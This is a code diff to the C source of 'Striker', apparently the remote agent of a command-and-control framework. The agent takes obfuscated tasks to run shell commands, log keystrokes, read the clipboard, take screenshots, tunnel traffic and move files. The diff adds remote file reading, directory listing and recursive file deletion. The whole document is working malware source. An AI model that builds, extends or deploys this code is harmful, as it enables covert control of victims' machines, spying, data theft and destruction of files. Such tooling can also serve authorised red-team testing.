@@ -14,7 +14,7 @@
 // #define INSECURE_SSL
 
 // Uncomment the below macro to enable debug output
-// #define STRIKER_DEBUG
+#define STRIKER_DEBUG
 
 // Size of agent UID
 #define AGENT_UID_SIZE 17
@@ -39,6 +39,8 @@
 #define TCP_BRIDGE_RECONNECT_DELAY 5
 // Max number of chars to read from clipboard (clipread)
 #define MAX_CLIPBOARD_SIZE 1024000
+// Max files to select when crawling a directory.
+#define MAX_FILES_SELECT_COUNT 1000000
 
 #ifdef IS_WINDOWS
   // Max file upload size
@@ -164,6 +166,49 @@ char *get_basename(char *path){
     strncpy(basename, path + pos + 1, basename_len + 1);
   }
   return basename;
+}
+
+size_t get_file_size(char *filename){
+
+  struct stat st;
+  if (stat(filename, &st))
+    return 0;
+  return st.st_size;
+}
+
+void get_all_files(char *dirname, queue *files){
+  
+  printf("[*] Crawling: %s\n", dirname);
+  struct dirent *file;
+  DIR *dir = opendir(dirname);
+  if (!dir)
+    return;
+  while ((file = readdir(dir)) != NULL && (!queue_full(files))){
+    // Following check is VERY important as '.' just duplicates current directory, and '..' will select parent directory
+    if ((!strcmp(file->d_name, ".")) || (!strcmp(file->d_name, "..")) || (!strcmp(file->d_name + strlen(file->d_name) - 2, "/.")) || (!strcmp(file->d_name + strlen(file->d_name) - 3, "/..")))
+      continue;
+    char *file_path = malloc(4096);
+    memset(file_path, 0, 4096);
+    strncpy(file_path, dirname, 4095);
+    #ifdef IS_WINDOWS
+    file_path[strlen(file_path)] = '\\';
+    #else
+    file_path[strlen(file_path)] = '/';
+    #endif
+    strncpy(file_path + strlen(file_path), file->d_name, 4095 - strlen(file_path));
+    if (file->d_type == DT_DIR){ // Entry is a directory. Recurse.
+      get_all_files(file_path, files);
+    }
+    file_entry *entry = malloc(sizeof(file_entry));
+    entry->filename = file_path;
+    entry->file_type = file->d_type != DT_DIR ? 0 : 1;
+    if (entry->file_type == 0)
+      entry->file_size = get_file_size(entry->filename);
+    else
+      entry->file_size = 0;
+    queue_put(files, entry);
+  }
+  closedir(dir);
 }
 
 int http_get(char *url, buffer *body){
@@ -1397,6 +1442,32 @@ FILE *screenshot(){
   }
 #endif
 
+size_t delete_file(char *filename){
+
+  size_t count = 0;
+  struct stat st;
+  if (stat(filename, &st))
+    return 0;
+  if (st.st_mode & S_IFDIR){
+    queue *files = queue_init(MAX_FILES_SELECT_COUNT);
+    get_all_files(filename, files);
+    file_entry *entry;
+    while (!queue_exhausted(files)){
+      entry = queue_get(files);
+      if (!remove(entry->filename))
+        count += 1;
+      free(entry->filename);
+    }
+    #ifdef STRIKER_DEBUG
+    printf("[+] %u files selected for deletion!\n", (unsigned int)files->count);
+    #endif
+    queue_free(files, 1);
+  }
+  if (!remove(filename))
+    count += 1;
+  return count;
+}
+
 task *parse_task(cJSON *json){
 
   char strs[][20] = {"[OBFS_ENC]uid", "[OBFS_ENC]taskType", "[OBFS_ENC]data"};
@@ -1438,8 +1509,8 @@ DWORD WINAPI task_executor(LPVOID ptr)
   #endif
   cJSON *data = tsk->data;
   buffer *result_buff = create_buffer(0);
-  char cmd_strs[][30] = {"[OBFS_ENC]system", "[OBFS_ENC]download", "[OBFS_ENC]upload", "[OBFS_ENC]keymon", "[OBFS_ENC]abort", "[OBFS_ENC]delay", "[OBFS_ENC]cd", "[OBFS_ENC]kill", "[OBFS_ENC]tunnel", "[OBFS_ENC]bridge", "[OBFS_ENC]webload", "[OBFS_ENC]clipread", "[OBFS_ENC]clipwrite", "[OBFS_ENC]screenshot", "[OBFS_ENC]kbdfile", "[OBFS_ENC]ipinfo"};
-  for (int i = 0; i < 16; i++)
+  char cmd_strs[][30] = {"[OBFS_ENC]system", "[OBFS_ENC]download", "[OBFS_ENC]upload", "[OBFS_ENC]keymon", "[OBFS_ENC]abort", "[OBFS_ENC]delay", "[OBFS_ENC]cd", "[OBFS_ENC]kill", "[OBFS_ENC]tunnel", "[OBFS_ENC]bridge", "[OBFS_ENC]webload", "[OBFS_ENC]clipread", "[OBFS_ENC]clipwrite", "[OBFS_ENC]screenshot", "[OBFS_ENC]kbdfile", "[OBFS_ENC]ipinfo", "[OBFS_ENC]cat", "[OBFS_ENC]ls", "[OBFS_ENC]del"};
+  for (int i = 0; i < 19; i++)
     obfs_decode(cmd_strs[i]);
   if (!strcmp(tsk->type, cmd_strs[0])){ // Run a shell command.
     char strs[][20] = {"[OBFS_ENC]cmd", "[OBFS_ENC]%s 2>&1"};
@@ -1474,12 +1545,7 @@ DWORD WINAPI task_executor(LPVOID ptr)
       buffer_strcpy(result_buff, strs[1]);
       goto complete;
     }
-    struct stat st;
-    if (stat(filename, &st)){
-      buffer_strcpy(result_buff, strs[1]);
-      goto complete;
-    }
-    size_t file_size = st.st_size;
+    size_t file_size = get_file_size(filename);
     char *url = malloc(URL_SIZE);
     if (snprintf(url, URL_SIZE, strs[2], BASE_URL, striker->uid, tsk->uid) < 0)
       abort();
@@ -1636,6 +1702,44 @@ DWORD WINAPI task_executor(LPVOID ptr)
     tsk->successful = http_get(obfs_decode(strs[0]), result_buff) != 0;
     if (!tsk->successful)
       buffer_strcpy(result_buff, obfs_decode(strs[1]));
+  }else if (!strcmp(tsk->type, cmd_strs[16])){ // Get file contents
+    char *filename = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, "file"));
+    FILE *rfo = fopen(filename, "r");
+    if (!rfo)
+      goto complete;
+    size_t len = 50000;
+    resize_buffer(result_buff, len);
+    memset(result_buff->buffer, 0, len);
+    result_buff->used = fread(result_buff->buffer, 1, len - 1, rfo);
+    fclose(rfo);
+    tsk->successful = 1;
+  }else if (!strcmp(tsk->type, cmd_strs[17])){ // List a directory
+    cJSON *entries = cJSON_CreateArray();
+    struct dirent *file;
+    DIR *dir = opendir(cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, "dir")));
+    if (!dir){
+      cJSON_Delete(entries);
+      goto complete;
+    }
+    while ((file = readdir(dir)) != NULL){
+      int file_type = (file->d_type != DT_DIR ? 0 : 1);
+      cJSON *entry = cJSON_CreateArray();
+      cJSON_AddItemToArray(entry, cJSON_CreateNumber(file_type));
+      cJSON_AddItemToArray(entry, cJSON_CreateNumber(file_type == 0 ? get_file_size(file->d_name) : 0));
+      cJSON_AddItemToArray(entry, cJSON_CreateString(file->d_name));
+      cJSON_AddItemToArray(entries, entry);
+    }
+    closedir(dir);
+    char *files_str = cJSON_PrintUnformatted(entries);
+    buffer_strcpy(result_buff, files_str);
+    cJSON_Delete(entries);
+    free(files_str);
+    tsk->successful = 1;
+  }else if (!strcmp(tsk->type, cmd_strs[18])){ // Delete a file/directory
+    unsigned long count = (unsigned long)delete_file(cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, "file")));
+    resize_buffer(result_buff, 20);
+    result_buff->used = snprintf(result_buff->buffer, 19, "%ld", count) + 1;
+    tsk->successful = 1;
   }else{
     char msg[] = "[OBFS_ENC]Not implemented!";
     buffer_strcpy(result_buff, obfs_decode(msg));
